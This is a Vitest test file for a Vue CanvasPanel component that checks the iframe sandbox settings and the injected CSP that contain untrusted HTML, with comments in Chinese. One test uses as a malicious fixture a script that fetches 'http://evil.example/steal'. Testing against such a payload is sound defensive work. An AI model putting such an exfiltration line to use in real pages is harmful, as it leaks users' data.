import { mount } from '@vue/test-utils'
import { nextTick } from 'vue'
import { describe, it, expect, vi, beforeEach } from 'vitest'

// CanvasPanel（P30 WS14）：
// - 无画布时不渲染；
// - SSE canvas.open 后渲染 iframe：sandbox="allow-scripts" 且**不带**
//   allow-same-origin（逃逸防线一）；srcdoc = 注入严格 CSP meta 的原文
//   （逃逸防线二，v1 无网络）；
// - 恶意脚本场景：CSP meta 在 srcdoc 内先于脚本 + sandbox 缺省同源
//   （真浏览器逃逸 E2E 挂账，本套件只钉静态双闸在场）；
// - 关闭按钮 → 移除画布 + WSAPI canvas.close 回执；
// - 多块回复 → tab 切换。

const sseHandlers = new Map<string, (data?: unknown) => void>()
const wsapiRequest = vi.fn()

vi.mock('../../composables/useSSE', () => ({
  on: vi.fn((type: string, handler: (data?: unknown) => void) => {
    sseHandlers.set(type, handler)
  }),
  off: vi.fn(),
}))

vi.mock('../../composables/useWSAPI', () => ({
  // initWSAPI：useWebSocket 模块加载时的副作用导出（stores/session 引入
  // 链会触达），mock 需一并提供。
  initWSAPI: vi.fn(),
  useWSAPI: () => ({ request: wsapiRequest }),
}))

import { useCanvas, _resetCanvasForTest, CANVAS_CSP } from '../../composables/useCanvas'
import CanvasPanel from '../CanvasPanel.vue'

function fireCanvas(data: Record<string, unknown>) {
  sseHandlers.get('canvas.open')!(data)
}

beforeEach(() => {
  _resetCanvasForTest()
  sseHandlers.clear()
  wsapiRequest.mockReset().mockResolvedValue({ closed: true })
})

async function mounted(sessionId = 's1') {
  const { initCanvas } = useCanvas()
  const w = mount(CanvasPanel, { props: { sessionId } })
  initCanvas()
  return w
}

describe('CanvasPanel', () => {
  it('无画布时不渲染', async () => {
    const w = await mounted()
    expect(w.find('[data-testid="canvas-panel"]').exists()).toBe(false)
    w.unmount()
  })

  it('iframe sandbox 只带 allow-scripts（无 allow-same-origin），srcdoc 注入 CSP', async () => {
    const w = await mounted()
    fireCanvas({ session_id: 's1', html: '<p>hello canvas</p>', index: 0 })
    await nextTick()

    const frame = w.find('[data-testid="canvas-frame"]')
    expect(frame.exists()).toBe(true)
    // 逃逸防线一：沙盒不带同源——canvas 内容拿不到父页 DOM/localStorage。
    expect(frame.attributes('sandbox')).toBe('allow-scripts')
    expect(frame.attributes('sandbox')).not.toContain('allow-same-origin')
    // 逃逸防线二：srcdoc 内含严格 CSP meta + 原文完整保留。
    const srcdoc = frame.attributes('srcdoc') ?? ''
    expect(srcdoc).toContain('hello canvas')
    expect(srcdoc).toContain('Content-Security-Policy')
    expect(srcdoc).toContain(CANVAS_CSP)
    w.unmount()
  })

  it('恶意脚本场景：CSP meta 先于脚本在场 + sandbox 无同源（真浏览器逃逸测试挂账）', async () => {
    const w = await mounted()
    const evil = '<html><head><title>x</title></head><body><script>fetch("http://evil.example/steal")</script></body></html>'
    fireCanvas({ session_id: 's1', html: evil, index: 0 })
    await nextTick()

    const frame = w.find('[data-testid="canvas-frame"]')
    const srcdoc = frame.attributes('srcdoc') ?? ''
    // 完整文档形态：meta 注入 <head> 开头，先于 body 内脚本。
    const cspAt = srcdoc.indexOf('Content-Security-Policy')
    const scriptAt = srcdoc.indexOf('<script>')
    expect(cspAt).toBeGreaterThan(-1)
    expect(cspAt).toBeLessThan(scriptAt)
    expect(srcdoc).toContain("default-src 'none'")
    // 静态第二闸：沙盒属性缺省同源。
    expect(frame.attributes('sandbox')).toBe('allow-scripts')
    w.unmount()
  })

  it('关闭按钮移除画布并回执 canvas.close', async () => {
    const w = await mounted()
    fireCanvas({ session_id: 's1', html: '<p>x</p>', index: 0 })
    await nextTick()
    await w.find('[data-testid="canvas-close"]').trigger('click')

    expect(wsapiRequest).toHaveBeenCalledWith('canvas', 'close', { session_id: 's1' })
    await nextTick()
    expect(w.find('[data-testid="canvas-panel"]').exists()).toBe(false)
    w.unmount()
  })

  it('多块回复出 tab，切换改 srcdoc', async () => {
    const w = await mounted()
    fireCanvas({ session_id: 's1', html: '<p>first</p>', index: 0 })
    fireCanvas({ session_id: 's1', html: '<p>second</p>', index: 1 })
    await nextTick()

    const tabs = w.findAll('[data-testid="canvas-tab"]')
    expect(tabs.length).toBe(2)
    let srcdoc = w.find('[data-testid="canvas-frame"]').attributes('srcdoc') ?? ''
    expect(srcdoc).toContain('second', '新块到达自动切到最新')
    // 切回第一块。
    await tabs[0].trigger('click')
    srcdoc = w.find('[data-testid="canvas-frame"]').attributes('srcdoc') ?? ''
    expect(srcdoc).toContain('first')
    expect(srcdoc).not.toContain('second')
    w.unmount()
  })
})
